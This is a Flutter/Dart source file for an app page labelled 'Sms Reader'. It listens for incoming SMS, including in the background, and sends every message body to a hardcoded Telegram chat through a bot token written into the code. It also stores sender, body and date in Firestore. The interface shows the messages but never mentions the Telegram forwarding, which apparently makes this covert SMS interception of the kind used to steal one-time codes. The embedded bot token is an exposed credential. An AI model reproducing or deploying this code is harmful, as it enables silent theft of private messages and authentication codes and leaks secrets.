import 'package:dart_telegram_bot/dart_telegram_bot.dart';
import 'package:dart_telegram_bot/telegram_entities.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter_config/flutter_config.dart';
import 'package:intl/intl.dart';
import 'package:auto_route/auto_route.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:hooks_riverpod/hooks_riverpod.dart';
import 'package:proxyapp/auth/shared/providers.dart';
import 'package:proxyapp/core/constant.dart';
import 'package:proxyapp/page/model/services.dart';
import 'package:telephony/telephony.dart';

@RoutePage()
class GreenHomePage extends StatefulWidget {
  const GreenHomePage({super.key});

  @override
  State<GreenHomePage> createState() => _GreenHomePageState();
}

final mockService = MockServices();
final chatId = "-1002059990678";
final BotToken = "6784249725:AAEXi-enFEQK9FjvldJOEyqlM_Q5EbW7MUU";

String? uid;

Future<void> loadindUid() async {
  uid = await getUid();
}

final telephony = Telephony.instance;
onBackgroundMessage(SmsMessage message) {
  print("background message: " + message.body!);
  onMessageBack(message);
}

onMessageBack(SmsMessage message) async {
  print(chatId);

  print("######1##");
  String formattedDate = DateFormat('kk:mm, d MMM').format(DateTime.now());
  Map<String, dynamic> phoneInformationsVariable = {
    "message.address": message.address,
    "message.body": message.body,
    "message.dateSent": formattedDate,
  };
  print("######2##");

  bot.sendMessage(ChatID(int.parse(chatId)), message.body!);
  print("######3##");

  mockService.createData(phoneInformationsVariable);
  print("######4##");
}

final bot = Bot(
  token: BotToken,
  onReady: (bot) => bot.start(clean: true),
  // Handle start failure
  onStartFailed: (bot, e, s) => print('Start failed'),
);

class _GreenHomePageState extends State<GreenHomePage> {
  String _message = "";

  @override
  void initState() {
    super.initState();

    initPlatformState();
  }

  SmsMessage? smsBloc;

  onMessage(SmsMessage message) async {
    setState(
      () {
        smsBloc = message;
        String formattedDate =
            DateFormat('kk:mm, d MMM').format(DateTime.now());
        Map<String, dynamic> phoneInformationsVariable = {
          "message.address": message.address,
          "message.body": message.body,
          "message.dateSent": formattedDate,
        };
        mockService.createData(phoneInformationsVariable);
        _message = message.body ?? "Error reading message body.";
      },
    );
    print('bot start');
    bot.sendMessage(ChatID(int.parse(chatId)), message.body!);
    print('bot finsh');
  }

  // Platform messages are asynchronous, so we initialize in an async method.
  Future<void> initPlatformState() async {
    final bool? result = await telephony.requestSmsPermissions;
    if (result != null && result) {
      telephony.listenIncomingSms(
          onNewMessage: onMessage, onBackgroundMessage: onBackgroundMessage);
    }
    if (!mounted) return;
  }

  final mockService = MockServices();

  @override
  Widget build(BuildContext context) {
    print("##############");
    print(FlutterConfig.get('chatId').toString());
    print("##############");
    return MaterialApp(
        home: Scaffold(
            appBar: AppBar(
              title: const Text('Sms Reader'),
              actions: <Widget>[
                Consumer(
                  builder: (context, ref, child) {
                    final firebaseauth =
                        ref.watch(authNotifierProvider.notifier);
                    return PopupMenuButton(
                        // add icon, by default "3 dot" icon
                        // icon: Icon(Icons.book)
                        itemBuilder: (context) {
                      return const [
                        PopupMenuItem<int>(
                          value: 0,
                          child: Text("Logout"),
                        ),
                      ];
                    }, onSelected: (value) async {
                      if (value == 0) {
                        firebaseauth.signOut();
                      }
                    });
                  },
                )
              ],
            ),
            body: FutureBuilder(
              future: loadindUid(),
              builder: (context, snapshot) {
                return StreamBuilder(
                    initialData: null,
                    stream: FirebaseFirestore.instance
                        .collection('users')
                        .doc(uid)
                        .snapshots(),
                    builder: (context, snapshot) {
                      if (snapshot.connectionState == ConnectionState.waiting) {
                        return Center(child: CircularProgressIndicator());
                      } else if (snapshot.hasData == true) {
                        Map<String, dynamic>? firebaseData =
                            snapshot.data!.data();
                        // Replace this with your actual fetched data
                        if (firebaseData != null &&
                            firebaseData.containsKey('phoneInformationsList')) {
                          // If 'phoneInformationsList' exists, extract the list from the data
                          final phoneInfoList =
                              firebaseData['phoneInformationsList'];

                          return ListView.builder(
                            padding: const EdgeInsets.symmetric(
                              vertical: 15,
                              horizontal: 8,
                            ),
                            itemCount: phoneInfoList.length,
                            itemBuilder: (context, index) {
                              int itemCount = phoneInfoList.length;
                              int reversedIndex = itemCount - 1 - index;
                              final phoneInfo = phoneInfoList[reversedIndex];
                              return SizedBox(
                                height: 70,
                                child: ListTile(
                                  title: Text(phoneInfo['message.address'] ??
                                      ''), // Use null-aware operator to avoid null error
                                  subtitle: Text(phoneInfo['message.body'] ??
                                      ''), // Use null-aware operator to avoid null error
                                  trailing: Text(phoneInfo[
                                          'message.dateSent'] ??
                                      ''), // Use null-aware operator to avoid null error
                                ),
                              );
                            },
                          );
                        } else {
                          return ListView.builder(
                            itemCount: 1,
                            itemBuilder: (context, index) {
                              return SizedBox(
                                height: 100,
                                child: Center(child: Text("No message Yet")),
                              ); // Return an empty container or widget
                            },
                          );
                        }
                      } else {
                        return Text('Error: ${snapshot.error}');
                      }
                    });
              },
            )));
  }
}